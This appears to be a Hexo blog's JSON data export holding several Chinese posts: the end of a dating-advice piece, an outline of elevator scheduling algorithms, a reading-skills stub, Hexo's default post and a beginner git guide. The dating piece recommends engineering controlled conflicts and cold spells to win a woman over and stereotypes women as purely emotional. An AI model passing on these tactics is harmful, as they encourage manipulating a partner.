title=\"3.控场\"></a>3.控场</h2><p>①：表白不是冲锋的号角、而是胜利时的鸣金收兵。毕竟自古<code>表白多白表</code>、从来<code>姻缘少原因</code>。上来就说“我龙傲天从今天开始追你了”、你怕不是个傻子。\\<br>②：<code>前期</code>你可以每天主动聊天、但到<code>中后期</code>一定要克制住自己冲动、等她来找你、如果她不主动、那就是你前面做的不够好。千万不能让她觉得你整天什么事没有、就知道和她扯淡。\\<br>③：制造<code>完全可控</code>的小冲突小矛盾小冷战、把握好度、这个玩好了可以很快的提高感情基础。\\<br>④：制造强烈反差对比、不是忽冷忽热、而是常态热偶尔冷。</p>\n<p><strong>例二</strong>：\\<br>一起出去玩，要<code>买水果</code>。路过菠萝的时候你可以不经意的说一句“我也不喜欢吃菠萝、不知道这反人类的东西为什么存在”。路过操场的时候你就可以说一句“真搞不懂这些人大晚上跑什么步、这明明是清晨做的事”。</p>\n<p><code>心理距离</code>很重要、太冒进会容易让女生起戒备心。</p>\n<p>你只要一下走<code>进</code>了太多就一定要在合适的时候后<code>退</code>一点、一直走进会形成跪舔的局面、一直后退会让她觉得你是个傻逼。在来回踱步的过程中、你会惊奇的发现你们已经可以无话不说了、甚至距离近到只要一伸手、就可以抱到她。</p>\n<h2 id=\"4-鸣金收兵\"><a href=\"#4-鸣金收兵\" class=\"headerlink\" title=\"4.鸣金收兵\"></a>4.鸣金收兵</h2><p>女生以情绪为导向做出决定。</p>\n<p>一些小事往往是最能影响情绪的、别整天只顾着说情话、多做一点、她不瞎、都能看到的。</p>\n<p>直到有一天、她嘴里哼着“明明你也很爱我、没理由爱不到结果”、她其实还是不明白为什么爱不到结果。</p>\n<p>但这并不妨碍她在接下来的某个瞬间就变成了你的女朋友。她什么也没想、反正、跟着心情走、这就是女生。</p>\n<h2 id=\"写在后面的话\"><a href=\"#写在后面的话\" class=\"headerlink\" title=\"写在后面的话\"></a>写在后面的话</h2><p>如果你已经追上心爱的女孩了。</p>\n<p>可你的噩梦才刚刚开始</p>\n<p>追女生容易, 经营、运行一段恋情走下去才是最难的。</p>\n"},{"title":"电梯调度算法","date":"2018-05-07T02:08:18.000Z","archives":"Algorithm","_content":"# [电梯调度算法](https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&mid=2247485724&idx=1&sn=dafa64c031677b7c46b56e34d32c04ed&chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&mpshare=1&scene=23&srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd)\n\n## ---传统电梯调度算法---\n### 1.1 先来先服务算法（FCFS）\n\n  先来先服务（FCFS-First Come First Serve）算法\n\n### 1.2 最短寻找楼层时间优先算法（SSTF）\n\n### 1.3 扫描算法（SCAN）\n\n### 1.4 LOOK 算法\n\n### 1.5 SATF 算法\n\n## ---实时电梯调度算法---\n### 2.1 最早截止期优先调度算法\n\n### 2.2 SCAN-EDF 算法\n\n### 2.3 PI 算法\n\n### 2.4 FD-SCAN 算法\n\n## ---电梯调度高水平研究---\n以上两节介绍了几种简单的电梯调度算法。\n\n但是并不是说目前电梯调度只发展到这个层次。目前电梯的控制技术已经进入了电梯`群控`的时代。\n\n随着微机在电梯系统中的应用和人工智能技术的发展，智能群控技术得以迅速发展起来。\n\n由此，电梯的`群控`方面陆续发展出了一批新方法，包括：\n基于`专家系统`的电梯群控方法、\n基于`模糊逻辑`的电梯群控方法、\n基于`遗产算法`的电梯群控方法、\n基于`胜景网络`的电梯群控方法、\n基于`模糊神经网络`的电梯群控方法。\n\n## ---电梯问题的需求分析---\n\n### 4.1 电梯的初始状态\n\n### 4.2 电梯基本功能\n\n### 4.3 电梯按钮功能\n\n## 结束语\n\n可能这些算法都不是一个最佳方案，只是它确实解决了一定情况的问题。\n\n但是，对一个优秀的程序员而言，研究各种算法是无比快乐的。\n\n[查看原文](https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&mid=2247485724&idx=1&sn=dafa64c031677b7c46b56e34d32c04ed&chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&mpshare=1&scene=23&srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd)\n\n另：\n[【知名互联网公司面试中常见的算法题】](https://www.zhihu.com/question/24964987)\n","source":"_posts/电梯调度算法.md","raw":"---\ntitle: 电梯调度算法\ndate: 2018-05-07 10:08:18\ntags: 调度算法\narchives: Algorithm\ncategories: 算法\n---\n# [电梯调度算法](https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&mid=2247485724&idx=1&sn=dafa64c031677b7c46b56e34d32c04ed&chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&mpshare=1&scene=23&srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd)\n\n## ---传统电梯调度算法---\n### 1.1 先来先服务算法（FCFS）\n\n  先来先服务（FCFS-First Come First Serve）算法\n\n### 1.2 最短寻找楼层时间优先算法（SSTF）\n\n### 1.3 扫描算法（SCAN）\n\n### 1.4 LOOK 算法\n\n### 1.5 SATF 算法\n\n## ---实时电梯调度算法---\n### 2.1 最早截止期优先调度算法\n\n### 2.2 SCAN-EDF 算法\n\n### 2.3 PI 算法\n\n### 2.4 FD-SCAN 算法\n\n## ---电梯调度高水平研究---\n以上两节介绍了几种简单的电梯调度算法。\n\n但是并不是说目前电梯调度只发展到这个层次。目前电梯的控制技术已经进入了电梯`群控`的时代。\n\n随着微机在电梯系统中的应用和人工智能技术的发展，智能群控技术得以迅速发展起来。\n\n由此，电梯的`群控`方面陆续发展出了一批新方法，包括：\n基于`专家系统`的电梯群控方法、\n基于`模糊逻辑`的电梯群控方法、\n基于`遗产算法`的电梯群控方法、\n基于`胜景网络`的电梯群控方法、\n基于`模糊神经网络`的电梯群控方法。\n\n## ---电梯问题的需求分析---\n\n### 4.1 电梯的初始状态\n\n### 4.2 电梯基本功能\n\n### 4.3 电梯按钮功能\n\n## 结束语\n\n可能这些算法都不是一个最佳方案，只是它确实解决了一定情况的问题。\n\n但是，对一个优秀的程序员而言，研究各种算法是无比快乐的。\n\n[查看原文](https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&mid=2247485724&idx=1&sn=dafa64c031677b7c46b56e34d32c04ed&chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&mpshare=1&scene=23&srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd)\n\n另：\n[【知名互联网公司面试中常见的算法题】](https://www.zhihu.com/question/24964987)\n","slug":"电梯调度算法","published":1,"updated":"2018-05-07T02:26:22.929Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4n970002r8xjc1uh3cbi","content":"<h1 id=\"电梯调度算法\"><a href=\"#电梯调度算法\" class=\"headerlink\" title=\"电梯调度算法\"></a><a href=\"https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&amp;mid=2247485724&amp;idx=1&amp;sn=dafa64c031677b7c46b56e34d32c04ed&amp;chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&amp;mpshare=1&amp;scene=23&amp;srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd\" target=\"_blank\" rel=\"noopener\">电梯调度算法</a></h1><h2 id=\"—传统电梯调度算法—\"><a href=\"#—传统电梯调度算法—\" class=\"headerlink\" title=\"—传统电梯调度算法—\"></a>—传统电梯调度算法—</h2><h3 id=\"1-1-先来先服务算法（FCFS）\"><a href=\"#1-1-先来先服务算法（FCFS）\" class=\"headerlink\" title=\"1.1 先来先服务算法（FCFS）\"></a>1.1 先来先服务算法（FCFS）</h3><p>  先来先服务（FCFS-First Come First Serve）算法</p>\n<h3 id=\"1-2-最短寻找楼层时间优先算法（SSTF）\"><a href=\"#1-2-最短寻找楼层时间优先算法（SSTF）\" class=\"headerlink\" title=\"1.2 最短寻找楼层时间优先算法（SSTF）\"></a>1.2 最短寻找楼层时间优先算法（SSTF）</h3><h3 id=\"1-3-扫描算法（SCAN）\"><a href=\"#1-3-扫描算法（SCAN）\" class=\"headerlink\" title=\"1.3 扫描算法（SCAN）\"></a>1.3 扫描算法（SCAN）</h3><h3 id=\"1-4-LOOK-算法\"><a href=\"#1-4-LOOK-算法\" class=\"headerlink\" title=\"1.4 LOOK 算法\"></a>1.4 LOOK 算法</h3><h3 id=\"1-5-SATF-算法\"><a href=\"#1-5-SATF-算法\" class=\"headerlink\" title=\"1.5 SATF 算法\"></a>1.5 SATF 算法</h3><h2 id=\"—实时电梯调度算法—\"><a href=\"#—实时电梯调度算法—\" class=\"headerlink\" title=\"—实时电梯调度算法—\"></a>—实时电梯调度算法—</h2><h3 id=\"2-1-最早截止期优先调度算法\"><a href=\"#2-1-最早截止期优先调度算法\" class=\"headerlink\" title=\"2.1 最早截止期优先调度算法\"></a>2.1 最早截止期优先调度算法</h3><h3 id=\"2-2-SCAN-EDF-算法\"><a href=\"#2-2-SCAN-EDF-算法\" class=\"headerlink\" title=\"2.2 SCAN-EDF 算法\"></a>2.2 SCAN-EDF 算法</h3><h3 id=\"2-3-PI-算法\"><a href=\"#2-3-PI-算法\" class=\"headerlink\" title=\"2.3 PI 算法\"></a>2.3 PI 算法</h3><h3 id=\"2-4-FD-SCAN-算法\"><a href=\"#2-4-FD-SCAN-算法\" class=\"headerlink\" title=\"2.4 FD-SCAN 算法\"></a>2.4 FD-SCAN 算法</h3><h2 id=\"—电梯调度高水平研究—\"><a href=\"#—电梯调度高水平研究—\" class=\"headerlink\" title=\"—电梯调度高水平研究—\"></a>—电梯调度高水平研究—</h2><p>以上两节介绍了几种简单的电梯调度算法。</p>\n<p>但是并不是说目前电梯调度只发展到这个层次。目前电梯的控制技术已经进入了电梯<code>群控</code>的时代。</p>\n<p>随着微机在电梯系统中的应用和人工智能技术的发展，智能群控技术得以迅速发展起来。</p>\n<p>由此，电梯的<code>群控</code>方面陆续发展出了一批新方法，包括：<br>基于<code>专家系统</code>的电梯群控方法、<br>基于<code>模糊逻辑</code>的电梯群控方法、<br>基于<code>遗产算法</code>的电梯群控方法、<br>基于<code>胜景网络</code>的电梯群控方法、<br>基于<code>模糊神经网络</code>的电梯群控方法。</p>\n<h2 id=\"—电梯问题的需求分析—\"><a href=\"#—电梯问题的需求分析—\" class=\"headerlink\" title=\"—电梯问题的需求分析—\"></a>—电梯问题的需求分析—</h2><h3 id=\"4-1-电梯的初始状态\"><a href=\"#4-1-电梯的初始状态\" class=\"headerlink\" title=\"4.1 电梯的初始状态\"></a>4.1 电梯的初始状态</h3><h3 id=\"4-2-电梯基本功能\"><a href=\"#4-2-电梯基本功能\" class=\"headerlink\" title=\"4.2 电梯基本功能\"></a>4.2 电梯基本功能</h3><h3 id=\"4-3-电梯按钮功能\"><a href=\"#4-3-电梯按钮功能\" class=\"headerlink\" title=\"4.3 电梯按钮功能\"></a>4.3 电梯按钮功能</h3><h2 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h2><p>可能这些算法都不是一个最佳方案，只是它确实解决了一定情况的问题。</p>\n<p>但是，对一个优秀的程序员而言，研究各种算法是无比快乐的。</p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&amp;mid=2247485724&amp;idx=1&amp;sn=dafa64c031677b7c46b56e34d32c04ed&amp;chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&amp;mpshare=1&amp;scene=23&amp;srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd\" target=\"_blank\" rel=\"noopener\">查看原文</a></p>\n<p>另：<br><a href=\"https://www.zhihu.com/question/24964987\" target=\"_blank\" rel=\"noopener\">【知名互联网公司面试中常见的算法题】</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"电梯调度算法\"><a href=\"#电梯调度算法\" class=\"headerlink\" title=\"电梯调度算法\"></a><a href=\"https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&amp;mid=2247485724&amp;idx=1&amp;sn=dafa64c031677b7c46b56e34d32c04ed&amp;chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&amp;mpshare=1&amp;scene=23&amp;srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd\" target=\"_blank\" rel=\"noopener\">电梯调度算法</a></h1><h2 id=\"—传统电梯调度算法—\"><a href=\"#—传统电梯调度算法—\" class=\"headerlink\" title=\"—传统电梯调度算法—\"></a>—传统电梯调度算法—</h2><h3 id=\"1-1-先来先服务算法（FCFS）\"><a href=\"#1-1-先来先服务算法（FCFS）\" class=\"headerlink\" title=\"1.1 先来先服务算法（FCFS）\"></a>1.1 先来先服务算法（FCFS）</h3><p>  先来先服务（FCFS-First Come First Serve）算法</p>\n<h3 id=\"1-2-最短寻找楼层时间优先算法（SSTF）\"><a href=\"#1-2-最短寻找楼层时间优先算法（SSTF）\" class=\"headerlink\" title=\"1.2 最短寻找楼层时间优先算法（SSTF）\"></a>1.2 最短寻找楼层时间优先算法（SSTF）</h3><h3 id=\"1-3-扫描算法（SCAN）\"><a href=\"#1-3-扫描算法（SCAN）\" class=\"headerlink\" title=\"1.3 扫描算法（SCAN）\"></a>1.3 扫描算法（SCAN）</h3><h3 id=\"1-4-LOOK-算法\"><a href=\"#1-4-LOOK-算法\" class=\"headerlink\" title=\"1.4 LOOK 算法\"></a>1.4 LOOK 算法</h3><h3 id=\"1-5-SATF-算法\"><a href=\"#1-5-SATF-算法\" class=\"headerlink\" title=\"1.5 SATF 算法\"></a>1.5 SATF 算法</h3><h2 id=\"—实时电梯调度算法—\"><a href=\"#—实时电梯调度算法—\" class=\"headerlink\" title=\"—实时电梯调度算法—\"></a>—实时电梯调度算法—</h2><h3 id=\"2-1-最早截止期优先调度算法\"><a href=\"#2-1-最早截止期优先调度算法\" class=\"headerlink\" title=\"2.1 最早截止期优先调度算法\"></a>2.1 最早截止期优先调度算法</h3><h3 id=\"2-2-SCAN-EDF-算法\"><a href=\"#2-2-SCAN-EDF-算法\" class=\"headerlink\" title=\"2.2 SCAN-EDF 算法\"></a>2.2 SCAN-EDF 算法</h3><h3 id=\"2-3-PI-算法\"><a href=\"#2-3-PI-算法\" class=\"headerlink\" title=\"2.3 PI 算法\"></a>2.3 PI 算法</h3><h3 id=\"2-4-FD-SCAN-算法\"><a href=\"#2-4-FD-SCAN-算法\" class=\"headerlink\" title=\"2.4 FD-SCAN 算法\"></a>2.4 FD-SCAN 算法</h3><h2 id=\"—电梯调度高水平研究—\"><a href=\"#—电梯调度高水平研究—\" class=\"headerlink\" title=\"—电梯调度高水平研究—\"></a>—电梯调度高水平研究—</h2><p>以上两节介绍了几种简单的电梯调度算法。</p>\n<p>但是并不是说目前电梯调度只发展到这个层次。目前电梯的控制技术已经进入了电梯<code>群控</code>的时代。</p>\n<p>随着微机在电梯系统中的应用和人工智能技术的发展，智能群控技术得以迅速发展起来。</p>\n<p>由此，电梯的<code>群控</code>方面陆续发展出了一批新方法，包括：<br>基于<code>专家系统</code>的电梯群控方法、<br>基于<code>模糊逻辑</code>的电梯群控方法、<br>基于<code>遗产算法</code>的电梯群控方法、<br>基于<code>胜景网络</code>的电梯群控方法、<br>基于<code>模糊神经网络</code>的电梯群控方法。</p>\n<h2 id=\"—电梯问题的需求分析—\"><a href=\"#—电梯问题的需求分析—\" class=\"headerlink\" title=\"—电梯问题的需求分析—\"></a>—电梯问题的需求分析—</h2><h3 id=\"4-1-电梯的初始状态\"><a href=\"#4-1-电梯的初始状态\" class=\"headerlink\" title=\"4.1 电梯的初始状态\"></a>4.1 电梯的初始状态</h3><h3 id=\"4-2-电梯基本功能\"><a href=\"#4-2-电梯基本功能\" class=\"headerlink\" title=\"4.2 电梯基本功能\"></a>4.2 电梯基本功能</h3><h3 id=\"4-3-电梯按钮功能\"><a href=\"#4-3-电梯按钮功能\" class=\"headerlink\" title=\"4.3 电梯按钮功能\"></a>4.3 电梯按钮功能</h3><h2 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h2><p>可能这些算法都不是一个最佳方案，只是它确实解决了一定情况的问题。</p>\n<p>但是，对一个优秀的程序员而言，研究各种算法是无比快乐的。</p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzIyMjYyMzg3MA%3D%3D&amp;mid=2247485724&amp;idx=1&amp;sn=dafa64c031677b7c46b56e34d32c04ed&amp;chksm=e82be80ddf5c611b153984068d34a24a77b470c0f0736cb6be162a4370f97e44613f371ca97b&amp;mpshare=1&amp;scene=23&amp;srcid=05047xnZPzaJk0mK8Mo2G8jo%23rd\" target=\"_blank\" rel=\"noopener\">查看原文</a></p>\n<p>另：<br><a href=\"https://www.zhihu.com/question/24964987\" target=\"_blank\" rel=\"noopener\">【知名互联网公司面试中常见的算法题】</a></p>\n"},{"title":"阅读理解","date":"2018-04-20T02:51:01.000Z","archives":"大脑训练","_content":"为什么你的阅读速度慢、理解力低？\n\n## 视觉商数\n\n## 阅读习惯\n\n## 记忆理解习惯<br>\n+ 理解能力的增强也会提升记忆力，因为记忆的基础就是大脑根据信息组织意义的能力。\n\n.DS_Store\nThumbs.db\ndb.json\n*.log\nnode_modules/\npublic/\n.deploy*/","source":"_posts/阅读理解.md","raw":"---\ntitle: 阅读理解\ndate: 2018-04-20 10:51:01\ntags: 文学技能\narchives: 大脑训练\ncategories: 文学技能\n---\n为什么你的阅读速度慢、理解力低？\n\n## 视觉商数\n\n## 阅读习惯\n\n## 记忆理解习惯<br>\n+ 理解能力的增强也会提升记忆力，因为记忆的基础就是大脑根据信息组织意义的能力。\n\n.DS_Store\nThumbs.db\ndb.json\n*.log\nnode_modules/\npublic/\n.deploy*/","slug":"阅读理解","published":1,"updated":"2018-04-28T04:26:00.866Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4n9g0006r8xjy38c1xdz","content":"<p>为什么你的阅读速度慢、理解力低？</p>\n<h2 id=\"视觉商数\"><a href=\"#视觉商数\" class=\"headerlink\" title=\"视觉商数\"></a>视觉商数</h2><h2 id=\"阅读习惯\"><a href=\"#阅读习惯\" class=\"headerlink\" title=\"阅读习惯\"></a>阅读习惯</h2><h2 id=\"记忆理解习惯\"><a href=\"#记忆理解习惯\" class=\"headerlink\" title=\"记忆理解习惯\"></a>记忆理解习惯<br></h2><ul>\n<li>理解能力的增强也会提升记忆力，因为记忆的基础就是大脑根据信息组织意义的能力。</li>\n</ul>\n<p>.DS_Store<br>Thumbs.db<br>db.json<br><em>.log<br>node_modules/<br>public/<br>.deploy</em>/</p>\n","site":{"data":{}},"excerpt":"","more":"<p>为什么你的阅读速度慢、理解力低？</p>\n<h2 id=\"视觉商数\"><a href=\"#视觉商数\" class=\"headerlink\" title=\"视觉商数\"></a>视觉商数</h2><h2 id=\"阅读习惯\"><a href=\"#阅读习惯\" class=\"headerlink\" title=\"阅读习惯\"></a>阅读习惯</h2><h2 id=\"记忆理解习惯\"><a href=\"#记忆理解习惯\" class=\"headerlink\" title=\"记忆理解习惯\"></a>记忆理解习惯<br></h2><ul>\n<li>理解能力的增强也会提升记忆力，因为记忆的基础就是大脑根据信息组织意义的能力。</li>\n</ul>\n<p>.DS_Store<br>Thumbs.db<br>db.json<br><em>.log<br>node_modules/<br>public/<br>.deploy</em>/</p>\n"},{"title":"Hello World","date":"2014-10-13T07:21:11.000Z","archives":null,"_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\ndate: 2014-10-13 15:21:11\ntags: \narchives: \ncategories: \n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n","slug":"hello-world","published":1,"updated":"2018-04-16T07:54:25.144Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4n9j0007r8xjdrpcukqj","content":"<p>Welcome to <a href=\"https://hexo.io/\" target=\"_blank\" rel=\"noopener\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\" target=\"_blank\" rel=\"noopener\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"noopener\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"noopener\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"noopener\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\" target=\"_blank\" rel=\"noopener\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"noopener\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/deployment.html\" target=\"_blank\" rel=\"noopener\">Deployment</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\" target=\"_blank\" rel=\"noopener\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\" target=\"_blank\" rel=\"noopener\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"noopener\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"noopener\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"noopener\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\" target=\"_blank\" rel=\"noopener\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"noopener\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/deployment.html\" target=\"_blank\" rel=\"noopener\">Deployment</a></p>\n"},{"title":"git使用指南","date":"2018-04-28T02:18:52.000Z","archives":"版本控制","_content":"# git使用\n\n## 第一步(安装/全局配置)\n**安装**\n+ 百度 git 然后下载安装\n\n**配置**\n    \n一次性配置,设置`username`和`email`，因为github每次`commit`都会记录他们\n\n+ $ git config --global user.name \"自定义名字\" (注册时填写的名字)\n+ $ git config --global user.email \"email@地址.com\"(注册的地址)\n\n**检验配置是否成功**\n+ 使用 `git config -l` 查看里面的 `user.name` 和 `email` 的值\n\n**查看git版本**\n+ git --version\n\n**创建公钥**\n  + 第一步 : 创建 `ssh-keygen -t rsa -C '[email地址]'`\n  + 第二步 : 查看公钥 根据git命令行提示走 然后 打开路径下的`id_rsa.pub`\n    - 进入c盘的`C:\\Users\\标准用户\\.ssh`（一般都是在这个文加下）生成了两个文件，用记事本打开`id_rsa.pub`，全选然后复制。\n  + 第三步 : 登录 github 设置公钥\n    - 进入github官网，选择`setting` -> `ssh and GPG keys` -> `new ssh key` 然后title随便写一个，在下面面的内容处粘贴刚复制的内容。\n  + 选择则保存，然后进入git客户端输入：`ssh -T git@github.com`\n  + 如果`ssh key`配置成功的话，会看到以下效果\n    - $ ssh -T git@github.com\n    - Hi SunOfHomeBoy! You've successfully authenticated, but GitHub does not provide shell access.\n    - 您已经成功地进行了身份验证，但是GitHub不提供shell访问。\n\n## 第二步(初始化项目/本地配置)\n**git初始化**\n  + 在项目目录下 输入 \"git init\"\n\n**git简单命令**\n  + \"ls -a\" 查看项目目录\n\n  + \"git status\" 查看git状态 // 重要\n\n  + \"git add <文件名>\" 向git仓库提交一个文件 // 重要\n  \n  + \"$ git add .\" #把前目录下的所有文件全部添加到暂存区\n  \n  + \"git rm --cached <文件名>\" 从git中移除文件\n  \n  + \"git log\" 查看日志\n\n## 第三步(开始建立远程仓库连接)\n+ `git remote add origin git@github.com:yourName/yourRepo.git`\n\n  `yourName`和`yourRepo`表示你在`github的用户名`和`新建仓库`，加完之后进入.git\n\n  git remote add origin git@github.com:SunOfHomeBoy/SunOfHomeBoy.github.io.git\n\n  $ git push\n  fatal: The current branch dev has no upstream branch.\n  To push the current branch and set the remote as upstream, use\n\n    `git push --set-upstream origin dev`\n\n## 第四步(工作区与暂存区[版本库])\n+ 在git add 提交文件后 使用 \"git commit -m '一句话描述'\" 命令\n\n+ \"git push origin master\" 推送到远程服务器\n\n+ \"git pull origin master\" 从远程服务器拉取到本地\n\n+ \"git checkout -- <文件名>\"  放弃更改\n\n+ \"git reset ‘git log 打印出来的 commit 后面的字符串’ --hard\"  //回退到某个版本\n\n## 第五步(版本库管理)\n**git 删除本地分支**\n+ git branch -D br\n\n**git 删除远程分支**\n+ git push origin :br  (origin 后面有空格)\n+ git push origin 【空格】【冒号】【你的分支名字】\n+ git push 【你的远程仓库在本地的别名】【空格】【冒号】【你的分支名字】\n\n**git代码库回滚** (指将代码库某分支退回到以前的某个\"commit id\")\n本地代码库回滚\n+ git reset --hard commit-id :回滚到commit-id，将commit-id之后提交的commit都去除\n+ git reset --hard HEAD~3：将最近3次的提交回滚\n\n## 附：\n**Git 常用命令大全**\n(http://blog.csdn.net/dengsilinming/article/details/8000622)\n\n**如何使用git上传代码到github**\n(https://jingyan.baidu.com/article/e5c39bf5c8c4d039d76033b2.html)\n\n常用命令,仅供参考。\n\n## 单位，win10电脑\n  2017年12月29日 09:15:05\n  Ubuntu 